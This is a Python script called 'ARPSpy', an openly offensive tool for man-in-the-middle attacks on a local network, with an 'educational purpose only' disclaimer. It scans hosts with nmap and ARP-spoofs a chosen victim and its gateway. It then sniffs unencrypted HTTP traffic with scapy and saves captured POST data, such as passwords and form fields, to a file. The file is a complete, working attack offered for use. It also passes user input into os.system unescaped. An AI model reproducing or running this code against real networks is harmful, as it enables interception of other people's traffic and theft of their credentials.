import socket, sys, os, re, nmap3, logging
from termcolor import colored
from scapy.all import *
from datetime import datetime

logging.basicConfig(level=logging.DEBUG, format="%(asctime)s - %(levelname)s - %(message)s")

print(colored('''

             _____    _____     _____   _____   __     __
     /\     |  __ \  |  __ \   / ____| |  __ \  \ \   / /
    /  \    | |__) | | |__) | | (___   | |__) |  \ \_/ / 
   / /\ \   |  _  /  |  ___/   \___ \  |  ___/    \   /  
  / ____ \  | | \ \  | |       ____) | | |         | |   
 /_/    \_\ |_|  \_\ |_|      |_____/  |_|         |_|   
                                                         
                                                         

''', "white"))


print(colored("----------------------------------------------------------------------------------------", "green"))
print(colored("[+] Author: LE TRONG HOANG MINH (MINH ITACHI)", "magenta"))
print(colored("[+] Starting script at: " + str(datetime.now()), "magenta"))
print(colored("[+] ARPSpy - a lightweight tool to perform MITM attack on local network (educational purpose only)", "magenta"))
print(colored("----------------------------------------------------------------------------------------", "green"))

# Check root user
print(colored("[-] Checking user's privilege...", "yellow"))


def checkRootUser():
    if os.getuid() != 0:
        print(colored("[!] Run this script with sudo !!!", "red"))
        sys.exit()


checkRootUser()
print(colored("[+] You are root user", "green"))
print(colored("----------------------------------------------------------------------------------------", "green"))


def getPrivateIP():
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        return ip_address
    except Exception as err:
        print(colored("[!] Unable to get your local IP address", "red"))
        print(colored("[!] " + err, "red"))
        return "127.0.0.1"


# Get IP address
print(colored("[-] Getting your local IP address...", "yellow"))
ip_address = getPrivateIP()


# In case getPrivateIP return loopback interface IP address
def inputIPAddress(ip_address):
    if ip_address == "127.0.0.1" or ip_address == "127.0.1.1":
        print(colored("[!] Unable to get your local IP address", "red"))
        ip_address = input(
            colored("[-] Please manually input your IP address ('ifconfig' or 'ip a' command on Linux): ",
                    "yellow"))
        ipRegex = re.compile(r"\b((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\.|$)){4}\b")

        while not ipRegex.search(ip_address):
            ip_address = input(
                colored("[-] Please manually input your IP address ('ifconfig' or 'ip a' command on Linux): ",
                        "yellow"))

        return ip_address


ip_address = inputIPAddress(ip_address)
print(colored("[+] Your local IP address is " + ip_address, "green"))
print(colored("----------------------------------------------------------------------------------------", "green"))


# Requirement: net-tools package
def getNetworkIpAddress(ip_address):
    os.system("ipcalc " + ip_address + " > ipcalc_result.txt")
    ipcalc_result = open("ipcalc_result.txt", "r")

    for line in ipcalc_result.readlines():
        if line.find("Network") != -1:
            return re.compile(r"\s+").split(line)[1]

    ipcalc_result.close()


# calculate network CIDR
print(colored("[-] Calculating your local network CIDR...", "yellow"))
networkIPaddress = getNetworkIpAddress(ip_address)
print(colored("[+] Your local network CIDR is " + networkIPaddress, "green"))
print(colored("----------------------------------------------------------------------------------------", "green"))


def scanLocalNetwork(networkIPaddress):
    nmap = nmap3.Nmap()
    result = nmap.scan_top_ports(networkIPaddress)
    listOfHosts = list(result.keys())
    listOfHosts.pop()  # pop stats
    listOfHosts.pop()  # pop runtimes

    return listOfHosts


print(colored("[-] Scanning your local network... (this may take a few minutes)", "yellow"))
listOfHosts = scanLocalNetwork(networkIPaddress)


def chooseHostToAttack(listOfHosts):
    for host in listOfHosts:
        if host.endswith(".1"):
            print(colored("[+] Found host on local network: " + host + " (Possibly gateway)", "cyan"))
            continue
        print(colored("[+] Found host on local network: " + host, "cyan"))

    print(colored("----------------------------------------------------------------------------------------", "green"))

    choice = ""
    while choice != "n" and choice != "N":
        choice = input(colored("[-] Do you want to perform OS detection scanning on any host?(Y/N): ", "yellow"))
        if choice == "Y" or choice == "y":
            hostToScan = input(colored("[-] Host to scan (may take a few minutes): ", "yellow"))
            while hostToScan not in listOfHosts:
                print(colored("[!] Host invalid, please choose again", "red"))
                hostToScan = input(colored("[-] Host to scan (may take a few minutes): ", "yellow"))
            OSScan(hostToScan)

    print(colored("----------------------------------------------------------------------------------------", "green"))

    target = input(colored("[-] Choose host to perform attack: ", "yellow"))
    while target not in listOfHosts:
        print(colored("[!] Host invalid, please choose again", "red"))
        target = input(colored("[-] Choose host to perform attack: ", "yellow"))

    gateway = input(colored("[-] Choose gateway to perform attack: ", "yellow"))
    while gateway not in listOfHosts:
        print(colored("[!] Host invalid, please choose again", "red"))
        gateway = input(colored("[-] Choose gateway to perform attack: ", "yellow"))

    return (target, gateway)


def OSScan(host):
    try:
        nmap = nmap3.Nmap()
        result = nmap.nmap_os_detection(host)

        print(colored("[+] Result for scanning host " + host, "green"))
        print(colored("[+] Macaddress: " + result[host]["macaddress"]["addr"], "cyan"))
        print(colored("[+] Vendor: " + result[host]["macaddress"]["vendor"], "cyan"))

        if len(result[host]["osmatch"]) == 0:
            print(colored("[+] OS match (possible): None", "cyan"))
        else:
            print(colored("[+] OS match (possible): ", "cyan"))
            for os in result[host]["osmatch"]:
                print(colored("    [+] Name: " + os["name"] + " - Accuracy: " + os["accuracy"], "blue"))

        if len(result[host]["ports"]) == 0:
            print(colored("[+] Ports open: None", "cyan"))
        else:
            print(colored("[+] Ports open: ", "cyan"))
            for port in result[host]["ports"]:
                print(colored(
                    "    [+] Port: " + port["portid"] + " - Protocol: " + port["protocol"] + " - Service: " +
                    port["service"][
                        "name"] + " - State: " + port["state"], "blue"))
    except:
        OSScan(host)


target, gateway = chooseHostToAttack(listOfHosts)
print(colored("[+] Target specified: " + target, "green"))
print(colored("[+] Gateway specified: " + gateway, "green"))
print(colored("----------------------------------------------------------------------------------------", "green"))


def arpspoof(target, gateway):
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")  # enable port forwarding
    os.system("arpspoof -t " + gateway + " " + target + " 1>/dev/null 2>/dev/null &")  # spoof the target
    os.system("arpspoof -t " + target + " " + gateway + " 1>/dev/null 2>/dev/null &")  # spoof the gateway


print(colored("[-] Enabling IPv4 Port Forwarding...", "yellow"))
print(colored("[-] Spoofing target and gateway...", "yellow"))

arpspoof(target, gateway)
print(colored("----------------------------------------------------------------------------------------", "green"))


iface = input(colored("[-] Input your network interface to sniff ('ifconfig' or 'ip a' command on Linux): ", "yellow"))
print(colored("[+] Listening on " + iface + " for any HTTP POST data...", "yellow"))
print(colored("[+] Data will be save in data.txt in the same directory", "yellow"))
print(colored("[+] You have to check the data by hand to find what you're interested in", "yellow"))
print(colored("[+] If the file is empty, please patient and keep waiting", "yellow"))
print(colored("[+] Thanks for using my tool. Hope you could find something good !", "yellow"))
print(colored("----------------------------------------------------------------------------------------", "green"))

outputFile = open("data.txt", "w")


def packet_callback(packet):
    try:
        global outputFile
        if packet[TCP].payload:
            if packet[IP].dport == 80:  # HTTP
                payload = str(bytes(packet[TCP].payload))
                if payload.find("POST") != -1 or (payload.find("POST") == -1 and payload.find(
                        "GET") == -1):  # POST data or fragmentation IP packet data
                    outputFile.write(payload)
                    outputFile.write("\n")
                    outputFile.write(
                        "---------------------------------------------------------------------------------------------------------------------")
                    outputFile.write("\n")
                    print(colored("[+] POST data captured", "green"))
    except:
        pass


def sniffHTTPPostTraffic(iface):
    sniff(filter='tcp', prn=packet_callback, store=0, count=0, iface=iface)


sniffHTTPPostTraffic(iface)

# If you find some error in using the tool,
# try to understand and modify the script.
# It is not well-tested for any platform other than my Kali Machine

# Author: Minh Itachi
